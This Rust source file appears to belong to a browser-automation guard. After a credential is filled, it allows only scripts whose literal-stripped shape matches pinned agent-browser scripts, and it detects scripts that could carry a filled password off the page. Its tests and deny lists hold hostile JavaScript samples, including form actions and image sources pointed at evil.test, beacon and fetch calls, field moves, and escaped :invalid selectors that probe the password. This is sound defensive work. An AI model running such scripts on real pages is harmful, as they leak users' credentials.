//! The scripts a session lets through once it filled a credential: only agent-browser's own. Each script the driver
//! evaluates (`Runtime.evaluate`, `Runtime.callFunctionOn`, `Runtime.compileScript`) is parsed with a real JavaScript
//! parser (oxc) and its string, number and boolean literals become placeholders: what is left is its shape, the same
//! for `get text #a` as for `get text #b`. The shape's hash must be one of agent-browser's, pinned for its version in
//! `agent_browser_shapes.json` (made by `scripts/agent-browser-shapes.sh`). So a script can only do what one of
//! agent-browser's does, with other selectors and numbers; one that reads a field and reshapes it, or sends it, has a
//! shape of its own and is refused.
//!
//! Literals stay in the shape where they name what a script touches: a property key, and a computed member's
//! property (`el['value']`). On top of the shape, [`writes`] refuses what could carry a value off the page whichever
//! shape does it, with the literals as given: writing a form's action, a `src` or `href`, an `on*` handler or HTML,
//! running a string as code, and the clipboard. And a field's validation (`pattern`, `minlength`, …) may not be
//! written, nor its state queried by selector (`:invalid`, `[value…]`): together they would tell, one guess at a time,
//! whether a filled value matches.
use std::collections::HashSet;
use std::sync::LazyLock;

use oxc_allocator::Allocator;
use oxc_ast::ast::{
    Argument, BigIntLiteral, BooleanLiteral, CallExpression, ComputedMemberExpression, Expression,
    IdentifierReference, ImportExpression, NumericLiteral, PropertyKey, SimpleAssignmentTarget,
    StaticMemberExpression, StringLiteral, TemplateElement, UnaryExpression, VariableDeclarator,
};
use oxc_ast_visit::{Visit, walk};
use oxc_codegen::{Codegen, CodegenOptions, CommentOptions};
use oxc_parser::Parser;
use oxc_span::{SourceType, Span};
use serde::Deserialize;
use sha2::{Digest, Sha256};

/// agent-browser's script shapes, for the version the node installs.
pub const PINNED: &str = include_str!("agent_browser_shapes.json");

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Pinned {
    pub agent_browser: String,
    pub shapes: Vec<PinnedShape>,
}

#[derive(Deserialize)]
pub struct PinnedShape {
    pub hash: String,
    /// The shape itself, for a reader of the file.
    pub script: String,
}

static ALLOWED: LazyLock<HashSet<String>> = LazyLock::new(|| {
    serde_json::from_str::<Pinned>(PINNED)
        .map(|p| p.shapes.into_iter().map(|s| s.hash).collect())
        .unwrap_or_default()
});

/// How the driver hands a script over: an expression or program, or a function `callFunctionOn` calls.
#[derive(Clone, Copy, Debug, PartialEq)]
pub enum Kind {
    Script,
    Function,
}

/// A script with its literals as placeholders, and the hash of that.
#[derive(Debug)]
pub struct Shape {
    pub hash: String,
    pub script: String,
}

/// The source the parser reads: a function declaration is called as `(decl)`, so it is parsed as one. The newlines
/// keep a trailing line comment from eating the parenthesis.
fn source(script: &str, kind: Kind) -> String {
    match kind {
        Kind::Script => script.to_owned(),
        Kind::Function => format!("(\n{script}\n)"),
    }
}

/// The parsed program of `source`, or why there is none. Scripts with HTML-like comments are refused: browsers read
/// `<!--` and `-->` as comments in scripts, so a parser that doesn't could see code where the browser sees none.
fn parse<'a>(
    allocator: &'a Allocator,
    source: &'a str,
) -> Result<oxc_ast::ast::Program<'a>, String> {
    if source.contains("<!--") || source.contains("-->") {
        return Err("it holds an HTML comment marker".into());
    }
    let parsed = Parser::new(allocator, source, SourceType::script()).parse();
    if parsed.diagnostics.has_errors() {
        return Err("it is not a script fleetd can read".into());
    }
    Ok(parsed.program)
}

/// The script's shape. Fails on a script the parser can't read.
pub fn shape(script: &str, kind: Kind) -> Result<Shape, String> {
    let source = source(script, kind);
    let allocator = Allocator::default();
    let program = parse(&allocator, &source)?;
    let mut literals = Literals::default();
    literals.visit_program(&program);
    literals.spans.sort_by_key(|(span, _)| span.start);
    let mut placed = String::with_capacity(source.len());
    let mut at = 0;
    for (span, placeholder) in literals.spans {
        // A literal inside one already replaced (a template's own) is gone with it.
        if (span.start as usize) < at {
            continue;
        }
        placed.push_str(&source[at..span.start as usize]);
        placed.push_str(placeholder);
        at = span.end as usize;
    }
    placed.push_str(&source[at..]);
    // Printed again from its parse: the same however it was spaced or commented.
    let allocator = Allocator::default();
    let program = parse(&allocator, &placed)?;
    let script = Codegen::new()
        .with_options(CodegenOptions {
            minify: true,
            comments: CommentOptions::disabled(),
            ..CodegenOptions::default()
        })
        .build(&program)
        .code;
    let hash = Sha256::digest(script.as_bytes())
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect();
    Ok(Shape { hash, script })
}

/// Whether the shape is one of agent-browser's.
pub fn pinned(shape: &Shape) -> bool {
    ALLOWED.contains(&shape.hash)
}

/// The spans of a script's literals, each with its placeholder (spaced, so `case-1:` stays two tokens).
#[derive(Default)]
struct Literals {
    spans: Vec<(Span, &'static str)>,
}

impl<'a> Visit<'a> for Literals {
    fn visit_string_literal(&mut self, it: &StringLiteral<'a>) {
        self.spans.push((it.span, "\"\""));
    }

    fn visit_numeric_literal(&mut self, it: &NumericLiteral<'a>) {
        self.spans.push((it.span, " 0 "));
    }

    fn visit_big_int_literal(&mut self, it: &BigIntLiteral<'a>) {
        self.spans.push((it.span, " 0n "));
    }

    fn visit_boolean_literal(&mut self, it: &BooleanLiteral) {
        self.spans.push((it.span, " false "));
    }

    fn visit_unary_expression(&mut self, it: &UnaryExpression<'a>) {
        // `-4` is a number too.
        if it.operator.is_arithmetic()
            && matches!(
                it.argument,
                Expression::NumericLiteral(_) | Expression::BigIntLiteral(_)
            )
        {
            self.spans.push((it.span, " 0 "));
        } else {
            walk::walk_unary_expression(self, it);
        }
    }

    fn visit_template_element(&mut self, it: &TemplateElement<'a>) {
        // A template's text between `${}`: kept as the template's, but empty.
        self.spans.push((it.span, ""));
    }

    fn visit_property_key(&mut self, it: &PropertyKey<'a>) {
        // `{ 'value': x }`: the key names a property, so it is the shape's.
        if !matches!(
            it,
            PropertyKey::StringLiteral(_) | PropertyKey::NumericLiteral(_)
        ) {
            walk::walk_property_key(self, it);
        }
    }

    fn visit_computed_member_expression(&mut self, it: &ComputedMemberExpression<'a>) {
        // `el['value']`: the property is the shape's; `els[0]` is any element.
        self.visit_expression(&it.object);
        if !matches!(it.expression, Expression::StringLiteral(_)) {
            self.visit_expression(&it.expression);
        }
    }
}

/// Properties a sealed session's scripts may not set: where a form sends, what loads or links, a page's HTML, and how
/// a filled field shows.
const SINK_PROPERTIES: &[&str] = &[
    "action",
    "formAction",
    // Which form a field belongs to, and how a button sends it: another form posts it elsewhere.
    "formMethod",
    "formTarget",
    "formEnctype",
    // And how the form itself sends (`encoding` is `enctype`'s other name).
    "method",
    "target",
    "enctype",
    "encoding",
    "src",
    "srcdoc",
    "href",
    "ping",
    "data",
    "innerHTML",
    "outerHTML",
    "type",
    "style",
    "cssText",
    "webkitTextSecurity",
    "location",
    // A field's validation: with `:invalid`, it would test a filled value against a guess.
    "pattern",
    "minLength",
    "maxLength",
    "min",
    "max",
    "required",
    "step",
];

/// Attributes they may not set or remove, by name (lower case).
const SINK_ATTRIBUTES: &[&str] = &[
    "action",
    "formaction",
    "form",
    "formmethod",
    "formtarget",
    "formenctype",
    "method",
    "target",
    "enctype",
    "src",
    "srcdoc",
    "href",
    "xlink:href",
    "ping",
    "data",
    "type",
    "style",
    "pattern",
    "minlength",
    "maxlength",
    "min",
    "max",
    "required",
    "step",
];

/// Selector parts that tell a field's state, which a filled value decides: whether it is valid against the field's
/// pattern and lengths, empty, autofilled or in range, and its `value` attribute. Lower case, without whitespace.
const REVEALING_SELECTORS: &[&str] = &[
    ":invalid",
    ":valid",
    ":user-invalid",
    ":user-valid",
    ":placeholder-shown",
    ":autofill",
    ":-webkit-autofill",
    ":in-range",
    ":out-of-range",
    "[value",
    "|value",
];

/// `selector` as CSS reads it: escapes decoded (`\69` is `i`), comments and whitespace gone, in lower case.
fn css_plain(selector: &str) -> String {
    let chars: Vec<char> = selector.chars().collect();
    let mut out = String::with_capacity(selector.len());
    let mut i = 0;
    while i < chars.len() {
        match chars[i] {
            '/' if chars.get(i + 1) == Some(&'*') => {
                let rest: String = chars[i + 2..].iter().collect();
                match rest.find("*/") {
                    Some(end) => i += 2 + rest[..end].chars().count() + 2,
                    None => break,
                }
            }
            '\\' => {
                let hex: String = chars[i + 1..]
                    .iter()
                    .take(6)
                    .take_while(|c| c.is_ascii_hexdigit())
                    .collect();
                if hex.is_empty() {
                    out.extend(chars.get(i + 1));
                    i += 2;
                } else {
                    i += 1 + hex.len();
                    if chars.get(i).is_some_and(|c| c.is_whitespace()) {
                        i += 1;
                    }
                    out.push(
                        u32::from_str_radix(&hex, 16)
                            .ok()
                            .and_then(char::from_u32)
                            .unwrap_or('\u{fffd}'),
                    );
                }
            }
            c if c.is_whitespace() => i += 1,
            c => {
                out.push(c);
                i += 1;
            }
        }
    }
    out.to_lowercase()
}

/// The part of `selector` that would tell a field's state, if any ([`REVEALING_SELECTORS`]).
pub fn revealing_selector(selector: &str) -> Option<&'static str> {
    let plain = css_plain(selector);
    REVEALING_SELECTORS
        .iter()
        .find(|part| plain.contains(*part))
        .copied()
}

/// Methods that write HTML into the page, send data or run a string as code: refused whatever their arguments.
const SINK_METHODS: &[&str] = &[
    "insertAdjacentHTML",
    "setHTMLUnsafe",
    "createContextualFragment",
    "write",
    "writeln",
    "execCommand",
    "sendBeacon",
    "postMessage",
    "defineProperty",
    "defineProperties",
    "setAttributeNode",
    "setAttributeNodeNS",
];

/// Methods that move elements in the page: a filled field moved into another form is sent where that form sends.
/// agent-browser's own scripts move none.
const MOVES: &[&str] = &[
    "appendChild",
    "insertBefore",
    "replaceChild",
    "append",
    "prepend",
    "before",
    "after",
    "replaceWith",
    "replaceChildren",
    "insertAdjacentElement",
    "moveBefore",
    "adoptNode",
];

/// Names that run strings as code or send data, refused wherever they appear.
const SINK_NAMES: &[&str] = &[
    "eval",
    "Function",
    "fetch",
    "XMLHttpRequest",
    "WebSocket",
    "EventSource",
    "importScripts",
    "clipboard",
];

/// Whether a sealed session's driver may not set or remove the attribute `name`.
pub fn sink_attribute(name: &str) -> bool {
    SINK_ATTRIBUTES.contains(&name.to_ascii_lowercase().as_str()) || handler(name)
}

/// Whether `name` is an event handler (`onclick`, `onsubmit`): code that runs on the page's own events.
fn handler(name: &str) -> bool {
    name.len() > 2 && name[..2].eq_ignore_ascii_case("on")
}

/// What in the script could carry a filled value off the page, in plain words, if anything. Fails on a script the
/// parser can't read.
pub fn writes(script: &str, kind: Kind) -> Result<Option<String>, String> {
    let source = source(script, kind);
    let allocator = Allocator::default();
    let program = parse(&allocator, &source)?;
    let mut sinks = Sinks::default();
    sinks.visit_program(&program);
    Ok(sinks.found)
}

#[derive(Default)]
struct Sinks {
    found: Option<String>,
    /// Variables the script made as `{}` or `[]`: its own objects, which it may fill under any name.
    own: HashSet<String>,
}

impl Sinks {
    fn found(&mut self, why: String) {
        self.found.get_or_insert(why);
    }
}

/// A literal string argument.
fn string_arg<'b>(arguments: &'b [Argument<'_>], i: usize) -> Option<&'b str> {
    match arguments.get(i)? {
        Argument::StringLiteral(s) => s.value.as_str(),
        _ => None,
    }
}

impl<'a> Visit<'a> for Sinks {
    fn visit_string_literal(&mut self, it: &StringLiteral<'a>) {
        if let Some(part) = revealing_selector(it.value.as_str().unwrap_or_default()) {
            self.found(format!("it queries a field's state ({part})"));
        }
    }

    fn visit_template_element(&mut self, it: &TemplateElement<'a>) {
        // As the page gets it (cooked: `\x3a` is `:`), and as written, for `String.raw`.
        let Some(cooked) = it.value.cooked.and_then(|c| c.as_str()) else {
            self.found("it holds a template string fleetd can't read".into());
            return;
        };
        if let Some(part) =
            revealing_selector(cooked).or_else(|| revealing_selector(it.value.raw.as_str()))
        {
            self.found(format!("it queries a field's state ({part})"));
        }
    }

    fn visit_identifier_reference(&mut self, it: &IdentifierReference<'a>) {
        if SINK_NAMES.contains(&it.name.as_str()) {
            self.found(format!("it uses {}", it.name));
        }
    }

    fn visit_static_member_expression(&mut self, it: &StaticMemberExpression<'a>) {
        if SINK_NAMES.contains(&it.property.name.as_str()) {
            self.found(format!("it uses {}", it.property.name));
        }
        walk::walk_static_member_expression(self, it);
    }

    fn visit_simple_assignment_target(&mut self, it: &SimpleAssignmentTarget<'a>) {
        if let Some(member) = it.as_member_expression() {
            match member
                .static_property_name()
                .map(|n| n.as_str().unwrap_or_default())
            {
                Some(name) if SINK_PROPERTIES.contains(&name) || handler(name) => {
                    self.found(format!("it sets {name}"));
                }
                None if matches!(
                    member,
                    oxc_ast::ast::MemberExpression::ComputedMemberExpression(c)
                        if !c.object.get_identifier_reference().is_some_and(|o| self.own.contains(o.name.as_str()))
                ) =>
                {
                    self.found("it sets a property it names at run time".into());
                }
                _ => {}
            }
        }
        walk::walk_simple_assignment_target(self, it);
    }

    fn visit_call_expression(&mut self, it: &CallExpression<'a>) {
        let method = it
            .callee
            .get_member_expr()
            .and_then(|m| m.static_property_name())
            .and_then(|m| m.as_str());
        let callee = it
            .callee
            .get_identifier_reference()
            .map(|i| i.name.as_str());
        let arguments = it.arguments.as_slice();
        match method {
            Some(m) if SINK_METHODS.contains(&m) => self.found(format!("it calls {m}")),
            Some(m) if MOVES.contains(&m) => {
                self.found(format!("it moves elements in the page ({m})"))
            }
            Some(
                m @ ("setAttribute" | "removeAttribute" | "toggleAttribute" | "setAttributeNS"),
            ) => {
                let at = usize::from(m == "setAttributeNS");
                match string_arg(arguments, at) {
                    Some(name) if sink_attribute(name) => {
                        self.found(format!("it changes the {name} attribute"));
                    }
                    Some(_) => {}
                    None => self.found(format!("it calls {m} with a name it makes at run time")),
                }
            }
            Some(m @ ("setProperty" | "removeProperty")) => {
                let name = string_arg(arguments, 0).unwrap_or_default();
                if !name.starts_with("--")
                    && (name.is_empty() || name.contains("security") || name == "filter")
                {
                    self.found(format!("it calls {m} on how a field shows"));
                }
            }
            Some("assign" | "set")
                if it.callee.get_member_expr().is_some_and(|m| {
                    m.object().is_specific_id("Object") || m.object().is_specific_id("Reflect")
                }) =>
            {
                self.found("it sets properties it names at run time".into());
            }
            _ => {}
        }
        if matches!(callee.or(method), Some("setTimeout" | "setInterval"))
            && !matches!(
                arguments.first(),
                Some(Argument::ArrowFunctionExpression(_) | Argument::FunctionExpression(_))
            )
        {
            self.found("it runs a string as code".into());
        }
        walk::walk_call_expression(self, it);
    }

    fn visit_variable_declarator(&mut self, it: &VariableDeclarator<'a>) {
        if let (
            Some(name),
            Some(Expression::ObjectExpression(_) | Expression::ArrayExpression(_)),
        ) = (it.id.get_identifier_name(), &it.init)
        {
            self.own.insert(name.as_str().to_owned());
        }
        walk::walk_variable_declarator(self, it);
    }

    fn visit_import_expression(&mut self, it: &ImportExpression<'a>) {
        self.found("it imports a module".into());
        walk::walk_import_expression(self, it);
    }
}

/// Why a sealed session refuses the script, in plain words; None lets it through.
pub fn refusal(script: &str, kind: Kind) -> Option<String> {
    let shape = match shape(script, kind) {
        Ok(shape) => shape,
        Err(why) => return Some(why),
    };
    if !pinned(&shape) {
        return Some(format!(
            "it is not one of agent-browser {}'s own scripts",
            super::agent_browser::VERSION
        ));
    }
    match writes(script, kind) {
        Ok(found) => found,
        Err(why) => Some(why),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn of(script: &str) -> String {
        shape(script, Kind::Script).unwrap().script
    }

    #[test]
    fn a_shape_is_the_script_without_its_literals_however_it_is_spaced() {
        assert_eq!(
            of("document.querySelector('#a').textContent"),
            of("document.querySelector(\"#b > .c\")  /* x */ .textContent")
        );
        assert_eq!(of("scrollBy(0, 300)"), of("scrollBy(12, -4)"));
        assert_eq!(
            of("(x => { switch (x) { case-1: return!0 } })"),
            of("(x => { switch (x) { case 2: return !1 } })")
        );
        assert_eq!(of("f(true, `a${x}b`)"), of("f(false, `${x}`)"));
        assert_ne!(of("el.value"), of("el.textContent"));
        assert_ne!(
            of("el['value']"),
            of("el['textContent']"),
            "a computed member's property is the shape's"
        );
        assert_ne!(of("({ 'a': 1 })"), of("({ 'b': 1 })"), "so is a key");
        assert_ne!(
            of("btoa(document.querySelector('#pw').value)"),
            of("document.querySelector('#pw').value")
        );
        let function = shape(
            "function() { return this.getAttribute('href'); } // x",
            Kind::Function,
        )
        .unwrap();
        assert_eq!(
            function.hash,
            shape(
                "function() { return this.getAttribute(\"value\"); }",
                Kind::Function
            )
            .unwrap()
            .hash
        );
        assert!(shape("function() {", Kind::Function).is_err());
        assert!(shape("a <!-- b", Kind::Script).is_err());
    }

    #[test]
    fn the_pinned_shapes_are_agent_browsers_of_the_installed_version_and_each_its_own_hash() {
        let pinned: Pinned = serde_json::from_str(PINNED).unwrap();
        assert_eq!(
            pinned.agent_browser,
            super::super::agent_browser::VERSION,
            "agent-browser's version changed: run scripts/agent-browser-shapes.sh"
        );
        assert!(!pinned.shapes.is_empty());
        for pinned in &pinned.shapes {
            // A shape printed again is itself: else the parser changed how it prints, and the set must be made again.
            let again = shape(&pinned.script, Kind::Script).unwrap();
            assert_eq!(again.hash, pinned.hash, "{}", pinned.script);
        }
    }

    #[test]
    fn a_selector_that_tells_a_fields_state_is_found_however_it_is_written() {
        for selector in [
            "input:invalid",
            "#pw:Valid",
            "input:\\69nvalid",
            "input:\\000069 nvalid",
            "input:in\\valid",
            "input:/* x */invalid",
            "form :has(:user-invalid)",
            "input[ value ^= 'P' ]",
            "input[VALUE*=a i]",
            "[*|value]",
            ":placeholder-shown",
            "input:-webkit-autofill",
        ] {
            assert!(revealing_selector(selector).is_some(), "{selector}");
        }
        for selector in [
            "#pw",
            "input[type=\"password\"]",
            "[data-agent-browser-located='true']",
            "label > input:checked",
            "a.valid-link",
        ] {
            assert_eq!(revealing_selector(selector), None, "{selector}");
        }
    }

    #[test]
    fn writes_that_could_carry_a_value_off_the_page_are_found_whatever_the_shape() {
        for script in [
            "document.forms[0].action = 'https://evil.test/'",
            "document.querySelector('form').setAttribute('action', 'https://evil.test/')",
            "el.setAttribute('ONCLICK', 'x')",
            "el.setAttribute(name, v)",
            "img.src = 'https://evil.test/?' + v",
            "a.href = u",
            "el.onfocus = f",
            "document.body.innerHTML = h",
            "el.outerHTML += h",
            "el[k] = v",
            "const o = {}; el[k] = v",
            "Object.assign(form, { action: u })",
            "el.insertAdjacentHTML('beforeend', h)",
            "eval(s)",
            "new Function(s)()",
            "setTimeout('x()', 1)",
            "navigator.clipboard.readText()",
            "document.execCommand('copy')",
            "fetch(u)",
            "navigator.sendBeacon(u, v)",
            "import(u)",
            "input.type = 'text'",
            "el.style.removeProperty('-webkit-text-security')",
            "document.querySelector('#pw').setAttribute('pattern', 'P.*')",
            "el.setAttribute('MinLength', '9')",
            "document.querySelector('#pw')?.removeAttribute('maxlength')",
            "el.pattern = 'a.*'",
            "el.maxLength = 3",
            "document.querySelectorAll('input:invalid').length",
            "document.querySelector('#pw:VALID')",
            "document.querySelector('input:\\\\69nvalid')",
            "document.querySelector('input:/* x */invalid')",
            "el.matches(`:user-invalid`)",
            "document.querySelectorAll('input[ value^=\"P\"]').length",
            "document.querySelectorAll('[*|value]').length",
            "el.closest(':placeholder-shown')",
            "el.matches(':-webkit-autofill')",
            "document.querySelectorAll(`input\\x3ainvalid`).length",
            "document.querySelectorAll(`input\\u003avalid`).length",
            "document.querySelectorAll(`input\\u{3a}user-invalid`).length",
            "document.querySelectorAll(`input\\x5bvalue^=P]`).length",
            "document.querySelectorAll(String.raw`input\\3a invalid`).length",
            "document.querySelectorAll('input\\x3ainvalid').length",
            "document.querySelector('#pw').setAttribute('form', 'away')",
            "el.setAttribute('FormAction', u)",
            "el.setAttribute('formmethod', 'get')",
            "el.setAttribute('formtarget', '_blank')",
            "el.formTarget = '_blank'",
            "document.querySelector('form').setAttribute('method', 'get')",
            "document.querySelector('form').setAttribute('TARGET', '_blank')",
            "document.querySelector('form').setAttribute('enctype', 'text/plain')",
            "document.forms[0].method = 'get'",
            "document.forms[0].target = 'away'",
            "document.forms[0].enctype = 'text/plain'",
            "document.forms[0].encoding = 'text/plain'",
            "document.querySelector('#away').appendChild(document.querySelector('#pw'))",
            "away.append(pw)",
            "away.insertBefore(pw, null)",
            "pw.replaceWith(other)",
            "away.insertAdjacentElement('afterbegin', pw)",
            "away.moveBefore(pw, null)",
        ] {
            assert!(writes(script, Kind::Script).unwrap().is_some(), "{script}");
        }
        for script in [
            "el.value = 'x'; el.dispatchEvent(new Event('input', { bubbles: true }))",
            "el.setAttribute('data-agent-browser-located', 'true')",
            "el.removeAttribute('data-agent-browser-located')",
            "this.scrollIntoView({ block: 'center' })",
            "setTimeout(() => r(), 50)",
            "el.style.setProperty('--x', '1')",
            "document.title",
            "const result = {}; for (const p of s) { result[p] = s.getPropertyValue(p); }",
        ] {
            assert_eq!(writes(script, Kind::Script).unwrap(), None, "{script}");
        }
    }
}
